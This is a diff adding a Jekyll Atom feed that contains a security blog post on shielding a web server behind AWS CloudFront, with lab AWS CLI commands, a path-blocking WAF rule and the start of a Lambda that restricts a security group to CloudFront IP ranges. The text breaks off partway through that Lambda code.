@@ -1,0 +1,1295 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://secariolabs.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://secariolabs.github.io/" rel="alternate" type="text/html" /><updated>2024-12-22T09:37:53+00:00</updated><id>https://secariolabs.github.io/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Protecting Assets Behind CloudFront</title><link href="https://secariolabs.github.io/protecting-assets-behind-cloudfront/" rel="alternate" type="text/html" title="Protecting Assets Behind CloudFront" /><published>2023-04-09T12:24:47+00:00</published><updated>2023-04-09T12:24:47+00:00</updated><id>https://secariolabs.github.io/protecting-assets-behind-cloudfront</id><content type="html" xml:base="https://secariolabs.github.io/protecting-assets-behind-cloudfront/"><![CDATA[<p>One of the most common ways of bypassing a Web Application Firewall (WAF) involves finding out the backend servers’ address and connecting to it directly. An IP can be leaked in many ways, including DNS history, HTTP headers, cookies, virtual host routing with shared infrastructure, stack traces leaking source code, successful server-side request forgery attacks, even sometimes you can find it in the JavaScript source map. And assuming you locate the IP you can then directly reach the server and bypass all the protections and logging that a WAF provides.</p>
+
+<p>Very often during engagements, we assess web applications positioned behind AWS CloudFront, which by default is not a WAF but a Content Delivery Network (CDN) designed to speed up the loading time of a website by caching static files and delivering them quickly thanks to the many nodes CloudFront has all over the world. Even though CloudFront by default does not operate as a WAF, it does provide <a href="https://docs.aws.amazon.com/waf/latest/developerguide/cloudfront-features.html">an intuitive way</a> of adding WAF rules which can then be applied on each request passing through the service. More often than not, we see them being used. The rules can either be a managed subscription by a third-party vendor (e.g., F5) or they can be inline, written manually by the application owner.</p>
+
+<p>As AWS does not provide a simple way for developers to limit requests to their web applications (EC2) to be coming only from CloudFront, very often people try to improvise with different ways of enforcing the chain. For example, they use <strong>tokens</strong> – <a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/add-origin-custom-headers.html">adding a custom HTTP header</a> with a unique value which is sent with all requests from CloudFront and then verified on the web application server. While this is a strict technique relying on a shared secret, there are both security concerns with the secret leaking (when a header is reflected in the response), and it also adds a very large complexity as there must be an additional mechanism that can rotate the secret. Rotation involves changes to AWS resources and to the application logic, not to mention the potential downtime if these actions are not synchronized fully.</p>
+
+<p>A lesser-known technique that <a href="https://aws.amazon.com/blogs/security/automatically-update-security-groups-for-amazon-cloudfront-ip-ranges-using-aws-lambda/">AWS has suggested</a> <a href="https://aws.amazon.com/blogs/security/how-to-automatically-update-your-security-groups-for-amazon-cloudfront-and-aws-waf-by-using-aws-lambda/">over the years</a> is to restrict access based on an IP address. While this sounds very much like what Cloudflare has as its default recommendation, with CloudFront things are a bit more complicated as AWS does not have a constant strict address pool for this service, but rather they rotate IP addresses frequently — meaning that if you don’t update the firewall immediately when a change occurs, you risk both downtimes as new requests could be coming from a non-approved IP address and attacks from servers/services that now have an IP address which was previously associated with CloudFront.</p>
+
+<p>In this article we will build a lab in which we will 1) create a simple application behind CloudFront, 2) place some WAF rules and demonstrate the weakness, and 3) configure an IP-based restriction that should protect the end system.</p>
+
+<h2 id="setting-up-the-environment">Setting up the Environment</h2>
+
+<p>For this example, we can create a simple web server in AWS with a <em>public</em> and a <em>private</em> page which we will then try to protect with WAF rules on CloudFront.</p>
+
+<h3 id="creating-the-web-server">Creating the Web Server</h3>
+
+<p>The first thing we need to do is create a security group with an inbound “allow all” rule for port 80:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws ec2 create-security-group<span class="se">\</span>
+	<span class="nt">--group-name</span> ExampleWebsite<span class="se">\</span>
+	<span class="nt">--description</span> <span class="s2">"Example Website for testing CloudFront with WAF rules"</span>
+<span class="o">{</span>
+    <span class="s2">"GroupId"</span>: <span class="s2">"sg-0de46ea030c72802c"</span>
+<span class="o">}</span>
+<span class="nv">$ </span>aws ec2 authorize-security-group-ingress<span class="se">\</span>
+	<span class="nt">--group-id</span> sg-0de46ea030c72802c<span class="se">\</span>
+	<span class="nt">--protocol</span> tcp <span class="nt">--port</span> 80 <span class="nt">--cidr</span> 0.0.0.0/0
+</code></pre></div></div>
+
+<p>Next, optionally, we can quickly create an SSH key to use for the new system:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws ec2 create-key-pair<span class="se">\</span>
+	<span class="nt">--key-name</span> MyKeyPair<span class="se">\</span>
+	<span class="nt">--query</span> <span class="s1">'KeyMaterial'</span><span class="se">\</span>
+	<span class="nt">--output</span> text <span class="o">&gt;</span> MyKeyPair.pem
+</code></pre></div></div>
+
+<p>Finally, we will need a simple bash script <code class="language-plaintext highlighter-rouge">script.sh</code> to run at build time on the web server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+yum update <span class="nt">-y</span>
+
+yum <span class="nb">install</span> <span class="nt">-y</span> httpd.x86_64
+
+systemctl start httpd.service
+
+<span class="nb">echo</span> <span class="s2">"This is a public page"</span>  <span class="o">&gt;</span> /var/www/html/index.html
+
+<span class="nb">echo</span> <span class="s2">"secret"</span>  <span class="o">&gt;</span> /var/www/html/private.html
+</code></pre></div></div>
+
+<p>With these prerequisites out of the way, now is time to just build the web server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws ec2 run-instances<span class="se">\</span>
+	<span class="nt">--image-id</span> ami-0ad97c80f2dfe623b<span class="se">\</span>
+	<span class="nt">--instance-type</span> t2.nano<span class="se">\</span>
+	<span class="nt">--user-data</span> file://script.sh<span class="se">\</span>
+	<span class="nt">--security-group-ids</span> sg-0de46ea030c72802c<span class="se">\</span>
+	<span class="nt">--key-name</span> MyKeyPair
+<span class="o">{</span>
+    <span class="s2">"Groups"</span>: <span class="o">[]</span>,
+    <span class="s2">"Instances"</span>: <span class="o">[{</span>
+        <span class="s2">"AmiLaunchIndex"</span>: 0,
+        <span class="s2">"ImageId"</span>: <span class="s2">"ami-0ad97c80f2dfe623b"</span>,
+        <span class="s2">"InstanceId"</span>: <span class="s2">"i-0af0b1290214d5d95"</span>,
+...
+</code></pre></div></div>
+
+<p>A couple of minutes later, it is possible to get the public IP of the system with the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws ec2 describe-instances<span class="se">\</span>
+	<span class="nt">--instance-ids</span> i-0af0b1290214d5d95<span class="se">\</span>
+	<span class="nt">--query</span> <span class="s1">'Reservations[*].Instances[*].PublicIpAddress'</span><span class="se">\</span>
+	<span class="nt">--output</span> text
+18.133.242.145
+</code></pre></div></div>
+
+<p>Now is time to check the environment; we can quickly see that the server is up and the pages are there:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://18.133.242.145
+This is a public page
+<span class="nv">$ </span>curl http://18.133.242.145/private.html
+secret
+</code></pre></div></div>
+
+<h3 id="setting-up-route-53">Setting up Route 53</h3>
+
+<p>To set up CloudFront, we will need to first create a DNS record for the web server. We already a hosted zone configured in the AWS account which we can use, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws route53 list-hosted-zones
+<span class="o">{</span>
+    <span class="s2">"HostedZones"</span>: <span class="o">[{</span>
+        <span class="s2">"Id"</span>: <span class="s2">"/hostedzone/Z0520503IHM7MMFXXXXX"</span>,
+        <span class="s2">"Name"</span>: <span class="s2">"secariolabs.com."</span>,
+...
+
+</code></pre></div></div>
+
+<p>To create an <code class="language-plaintext highlighter-rouge">A</code> record mapping <code class="language-plaintext highlighter-rouge">private.demo.secariolabs.com</code> to the EC2 system, we will need the following <code class="language-plaintext highlighter-rouge">create-record.json</code> file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+  <span class="dl">"</span><span class="s2">Comment</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Testing creating a record set</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Changes</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+    <span class="dl">"</span><span class="s2">Action</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CREATE</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">ResourceRecordSet</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">Name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">private.demo.secariolabs.com</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">TTL</span><span class="dl">"</span><span class="p">:</span> <span class="mi">300</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">ResourceRecords</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+        <span class="dl">"</span><span class="s2">Value</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">18.133.242.145</span><span class="dl">"</span>
+      <span class="p">}]</span>
+    <span class="p">}</span>
+  <span class="p">}]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now is just a matter of making the request to Route 53, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws route53 change-resource-record-sets<span class="se">\</span>
+	<span class="nt">--hosted-zone-id</span> <span class="s2">"/hostedzone/Z0520503IHM7MMFXXXXX"</span><span class="se">\</span>
+	<span class="nt">--change-batch</span> file://create-record.json
+</code></pre></div></div>
+
+<p>A couple of seconds later you can check that the record is active:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws route53 get-change <span class="nt">--id</span> C018062338JPC4J7GN2I9
+<span class="o">{</span>
+    <span class="s2">"ChangeInfo"</span>: <span class="o">{</span>
+        <span class="s2">"Id"</span>: <span class="s2">"/change/C018062338JPC4J7GN2I9"</span>,
+        <span class="s2">"Status"</span>: <span class="s2">"INSYNC"</span>,
+        <span class="s2">"SubmittedAt"</span>: <span class="s2">"2023-04-07T00:50:12.606000+00:00"</span>,
+        <span class="s2">"Comment"</span>: <span class="s2">"Testing creating a record set"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>And we can confirm that the site is still accessible:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://private.demo.secariolabs.com
+This is a public page
+<span class="nv">$ </span>curl http://private.demo.secariolabs.com/private.html
+secret
+</code></pre></div></div>
+
+<h3 id="setting-up-cloudfront">Setting up CloudFront</h3>
+
+<p>The next step is to finally create the CloudFront distribution routing traffic to our website. To make the request to AWS we will need the following <code class="language-plaintext highlighter-rouge">distribution.json</code> file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+  <span class="dl">"</span><span class="s2">CallerReference</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cf-cli-distribution</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Comment</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Example Cloudfront Distribution</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Origins</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">Quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">Items</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+      <span class="dl">"</span><span class="s2">Id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">private.demo.secariolabs.com</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">DomainName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">private.demo.secariolabs.com</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">CustomOriginConfig</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">HTTPPort</span><span class="dl">"</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">HTTPSPort</span><span class="dl">"</span><span class="p">:</span> <span class="mi">443</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">OriginProtocolPolicy</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http-only</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">OriginSslProtocols</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+          <span class="dl">"</span><span class="s2">Items</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">TLSv1.2</span><span class="dl">"</span><span class="p">]</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}]</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">DefaultCacheBehavior</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">TargetOriginId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">private.demo.secariolabs.com</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">ViewerProtocolPolicy</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">redirect-to-https</span><span class="dl">"</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">AllowedMethods</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">Quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">Items</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">HEAD</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">],</span>
+      <span class="dl">"</span><span class="s2">CachedMethods</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">Quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Items</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">HEAD</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">]</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    <span class="dl">"</span><span class="s2">CachePolicyId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">4135ea2d-6df8-44a3-9df3-4b5a84be39ad</span><span class="dl">"</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">Enabled</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And the final command to create it looks as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws cloudfront create-distribution <span class="nt">--distribution-config</span> file://distribution.json
+<span class="o">{</span>
+    <span class="s2">"Location"</span>: <span class="s2">"https://cloudfront.amazonaws.com/2020-05-31/distribution/E3OSJ4978QOTZ2"</span>,
+    <span class="s2">"ETag"</span>: <span class="s2">"E1Y4BASGKG03MO"</span>,
+    <span class="s2">"Distribution"</span>: <span class="o">{</span>
+        <span class="s2">"Id"</span>: <span class="s2">"E3OSJ4978QOTZ2"</span>,
+        <span class="s2">"ARN"</span>: <span class="s2">"arn:aws:cloudfront::9536171XXXXX:distribution/E3OSJ4978QOTZ2"</span>,
+        <span class="s2">"Status"</span>: <span class="s2">"InProgress"</span>,
+        <span class="s2">"LastModifiedTime"</span>: <span class="s2">"2023-04-07T01:29:11.959000+00:00"</span>,
+        <span class="s2">"InProgressInvalidationBatches"</span>: 0,
+        <span class="s2">"DomainName"</span>: <span class="s2">"d1489et6zspdol.cloudfront.net"</span>,
+...
+</code></pre></div></div>
+
+<p>A couple of minutes later we can go ahead and check the connection to the site:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://d1489et6zspdol.cloudfront.net <span class="nt">-L</span>
+This is a public page
+<span class="nv">$ </span>curl http://d1489et6zspdol.cloudfront.net/private.html <span class="nt">-L</span>
+secret
+</code></pre></div></div>
+
+<h3 id="adding-a-waf-rule-to-cloudfront">Adding a WAF Rule to CloudFront</h3>
+
+<p>The next task for us is to create a WAF rule which we can use to protect everything going to <code class="language-plaintext highlighter-rouge">/private*</code>. The following <code class="language-plaintext highlighter-rouge">waf-rule.json</code> file was created for this purpose (note that <code class="language-plaintext highlighter-rouge">L3ByaXZhdGU=</code> is <code class="language-plaintext highlighter-rouge">/private</code>):</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[{</span>
+  <span class="dl">"</span><span class="s2">Name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">basic-rule</span><span class="dl">"</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Priority</span><span class="dl">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="dl">"</span><span class="s2">Statement</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">ByteMatchStatement</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+      <span class="dl">"</span><span class="s2">SearchString</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">L3ByaXZhdGU=</span><span class="dl">"</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">FieldToMatch</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+        <span class="dl">"</span><span class="s2">UriPath</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
+      <span class="p">},</span>
+      <span class="dl">"</span><span class="s2">TextTransformations</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
+        <span class="dl">"</span><span class="s2">Priority</span><span class="dl">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">NORMALIZE_PATH</span><span class="dl">"</span>
+      <span class="p">}],</span>
+      <span class="dl">"</span><span class="s2">PositionalConstraint</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">STARTS_WITH</span><span class="dl">"</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">Action</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">Block</span><span class="dl">"</span><span class="p">:</span> <span class="p">{}</span>
+  <span class="p">},</span>
+  <span class="dl">"</span><span class="s2">VisibilityConfig</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="dl">"</span><span class="s2">SampledRequestsEnabled</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">CloudWatchMetricsEnabled</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="dl">"</span><span class="s2">MetricName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">basic-rule</span><span class="dl">"</span>
+  <span class="p">}</span>
+<span class="p">}]</span>
+</code></pre></div></div>
+
+<p>Time to create the rule, where you will notice it is specifically created for CloudFront and the <code class="language-plaintext highlighter-rouge">us-east-1</code> region even though our EC2 instance is in <code class="language-plaintext highlighter-rouge">eu-west-2</code>. The reason this is the case is because CloudFront only exists in <code class="language-plaintext highlighter-rouge">us-east-1</code> and the WAF rule(s) have to be in the same region, whereas because CloudFront maps to an external IP address, there is no strict requirement for the EC2 system to be in the same region.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws wafv2 create-web-acl<span class="se">\</span>
+    <span class="nt">--name</span> TestWebAcl<span class="se">\</span>
+    <span class="nt">--scope</span> CLOUDFRONT<span class="se">\</span>
+    <span class="nt">--default-action</span> <span class="nv">Allow</span><span class="o">={}</span><span class="se">\</span>
+    <span class="nt">--visibility-config</span> <span class="nv">SampledRequestsEnabled</span><span class="o">=</span><span class="nb">true</span>,CloudWatchMetricsEnabled<span class="o">=</span><span class="nb">true</span>,MetricName<span class="o">=</span>TestWebAclMetrics<span class="se">\</span>
+    <span class="nt">--rules</span> file://waf-rule.json<span class="se">\</span>
+    <span class="nt">--region</span> us-east-1
+<span class="o">{</span>
+    <span class="s2">"Summary"</span>: <span class="o">{</span>
+        <span class="s2">"Name"</span>: <span class="s2">"TestWebAcl"</span>,
+        <span class="s2">"Id"</span>: <span class="s2">"74941941-24b9-4b1e-b0c0-276a653aad85"</span>,
+        <span class="s2">"Description"</span>: <span class="s2">""</span>,
+        <span class="s2">"LockToken"</span>: <span class="s2">"ba596cac-bdc8-490f-af7c-1f4734c720f3"</span>,
+        <span class="s2">"ARN"</span>: <span class="s2">"arn:aws:wafv2:us-east-1:9536171XXXXX:global/webacl/TestWebAcl/74941941-24b9-4b1e-b0c0-276a653aad85"</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>While the intuitive step at this moment would be to use <code class="language-plaintext highlighter-rouge">aws wafv2 associate-web-acl</code> this would not work. Applying WAF rules to CloudFront requires making updates to the configuration, rather than simply associating the rule. To make things even harder, AWS does not allow you to simply send an update with only the particular values you want to change, but rather you will need to download the configuration patch it and submit it again.</p>
+
+<p>To Download the configuration file we can use the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws cloudfront get-distribution-config<span class="se">\</span>
+	<span class="nt">--id</span> E3OSJ4978QOTZ2<span class="se">\</span>
+	<span class="nt">--query</span> <span class="s2">"DistributionConfig"</span><span class="se">\</span>
+	<span class="nt">--output</span> json <span class="o">&gt;</span> current-distribution.json
+</code></pre></div></div>
+
+<p>Next we can patch the <code class="language-plaintext highlighter-rouge">WebACLId</code> value to list the rule we want to be applied:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'/WebACLId/c\"WebACLId\":\"arn:aws:wafv2:us-east-1:9536171XXXXX:global/webacl/TestWebAcl/74941941-24b9-4b1e-b0c0-276a653aad85\",'</span> current-distribution.json <span class="o">&gt;</span> updated-distribution.json
+</code></pre></div></div>
+
+<p>Finally, we can make an update request, where you will notice we not only are passing the <code class="language-plaintext highlighter-rouge">DistributionId</code>, but also the <code class="language-plaintext highlighter-rouge">ETag</code> we received when we created the distribution.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aws cloudfront update-distribution<span class="se">\</span>
+	<span class="nt">--id</span> E3OSJ4978QOTZ2<span class="se">\</span>
+	<span class="nt">--distribution-config</span> file://updated-distribution.json<span class="se">\</span>
+	<span class="nt">--if-match</span> E1Y4BASGKG03MO
+<span class="o">{</span>
+    <span class="s2">"ETag"</span>: <span class="s2">"E2JUPVIBC3V15H"</span>,
+    <span class="s2">"Distribution"</span>: <span class="o">{</span>
+        <span class="s2">"Id"</span>: <span class="s2">"E3OSJ4978QOTZ2"</span>,
+        <span class="s2">"ARN"</span>: <span class="s2">"arn:aws:cloudfront::9536171XXXXX:distribution/E3OSJ4978QOTZ2"</span>,
+        <span class="s2">"Status"</span>: <span class="s2">"InProgress"</span>,
+        <span class="s2">"LastModifiedTime"</span>: <span class="s2">"2023-04-07T02:26:50.622000+00:00"</span>,
+        <span class="s2">"InProgressInvalidationBatches"</span>: 0,
+        <span class="s2">"DomainName"</span>: <span class="s2">"d1489et6zspdol.cloudfront.net"</span>,
+...
+</code></pre></div></div>
+
+<p>To make sure the rule is applied we can check the access to the pages:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl https://d1489et6zspdol.cloudfront.net
+This is a public page
+<span class="nv">$ </span>curl https://d1489et6zspdol.cloudfront.net/private.html
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/html4/loose.dtd"</span><span class="o">&gt;</span>
+&lt;HTML&gt;&lt;HEAD&gt;&lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">"text/html; charset=iso-8859-1"</span><span class="o">&gt;</span>
+&lt;TITLE&gt;ERROR: The request could not be satisfied&lt;/TITLE&gt;
+&lt;/HEAD&gt;&lt;BODY&gt;
+&lt;H1&gt;403 ERROR&lt;/H1&gt;
+&lt;H2&gt;The request could not be satisfied.&lt;/H2&gt;
+&lt;HR noshade <span class="nv">size</span><span class="o">=</span><span class="s2">"1px"</span><span class="o">&gt;</span>
+Request blocked.
+We can<span class="s1">'t connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again later, or contact the app or website owner.
+&lt;BR clear="all"&gt;
+If you provide content to customers through CloudFront, you can find steps to troubleshoot and help prevent this error by reviewing the CloudFront documentation.
+&lt;BR clear="all"&gt;
+&lt;HR noshade size="1px"&gt;
+&lt;PRE&gt;
+Generated by cloudfront (CloudFront)
+Request ID: QGJDmdNqJJ6_zS3ALUczF-8NrM-HDKqTzNu-CZoppz6bi3nWv_cSIw==
+&lt;/PRE&gt;
+&lt;ADDRESS&gt;
+&lt;/ADDRESS&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+</span></code></pre></div></div>
+
+<h2 id="strengthening-the-environment">Strengthening the Environment</h2>
+
+<p>At this point, you will be right to notice that direct requests to <code class="language-plaintext highlighter-rouge">http://private.demo.secariolabs.com/private.html</code> would still be successful because in this case the WAF would not be applied. The traffic wouldn’t be passing through it but directly to the server.</p>
+
+<h3 id="creating-a-custom-lambda">Creating a Custom Lambda</h3>
+
+<p>To handle this, we can follow the recommendation from AWS and create our own Lambda function that pulls the latest list of IP addresses associated with CloudFront and updates the rules on the security group attached to our web server. In effect that would prevent unauthorized traffic and enforce a chain.</p>
+
+<p>The Lambda will need to have the following <code class="language-plaintext highlighter-rouge">lambda_function.py</code> file:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">boto3</span>
+<span class="kn">import</span> <span class="n">urllib.request</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+
+
+<span class="n">INGRESS_PORTS</span> <span class="o">=</span> <span class="p">[</span><span class="mi">80</span><span class="p">]</span>  <span class="c1"># but may as well be [80, 443] or just [443]
+</span><span class="n">VPC_ID</span> <span class="o">=</span> <span class="sh">"</span><span class="s">vpc-032a791ded3139c0b</span><span class="sh">"</span>  <span class="c1"># change me
+</span><span class="n">SECURITYGROUP_ID</span> <span class="o">=</span> <span class="sh">"</span><span class="s">sg-0de46ea030c72802c</span><span class="sh">"</span>  <span class="c1"># change me
+</span><span class="n">REGION</span> <span class="o">=</span> <span class="sh">"</span><span class="s">eu-west-2</span><span class="sh">"</span>  <span class="c1"># change me
+</span>
+<span class="n">ec2_client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="nf">client</span><span class="p">(</span><span class="sh">"</span><span class="s">ec2</span><span class="sh">"</span><span class="p">,</span> <span class="n">region_name</span><span class="o">=</span><span class="n">REGION</span><span class="p">)</span>
+<span class="n">ec2_resource</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="nf">resource</span><span class="p">(</span><span class="sh">"</span><span class="s">ec2</span><span class="sh">"</span><span class="p">,</span> <span class="n">region_name</span><span class="o">=</span><span class="n">REGION</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
+    <span class="c1"># SNS message notification event when the ip ranges document is rotated
+</span>    <span class="n">message</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">event</span><span class="p">[</span><span class="sh">"</span><span class="s">Records</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">Sns</span><span class="sh">"</span><span class="p">][</span><span class="sh">"</span><span class="s">Message</span><span class="sh">"</span><span class="p">])</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">])</span>
